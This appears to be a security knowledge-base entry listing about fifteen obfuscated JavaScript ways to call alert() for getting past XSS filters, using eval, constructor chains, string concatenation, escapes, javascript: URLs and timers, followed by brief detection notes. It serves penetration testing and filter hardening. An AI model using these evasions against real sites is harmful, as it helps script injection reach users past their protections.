---
id: 950a311e-7f25-454e-9789-5e1061c687c0
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.768630+00:00'
updated_at: '2023-04-10T20:21:46.075934+00:00'
tags:
  - xss
  - obfuscation
  - multiple-techniques
platforms:
  - Web
  - Browser
validated: true
---

# Multiple-XSS-Alert-Obfuscation-Techniques

## Code

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29`;
```

## Description

A collection of obfuscated alert invocations using eval, constructors, string concat, number-to-string conversion, regex sources, hex escapes, open/location, and timers.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | Hardcoded numbers as alert args | 0-14 |

## Usage

Test individually or in sequence to find working bypasses against specific filters.

## Detection

- Patterns like string concatenation for 'alert', constructor chains, or timer-based executions.
- Hex/Unicode escapes in JS source.

## Related

- [[procedures/Bypass-XSS-Alert-Filter-Using-Alternate-Functions]]
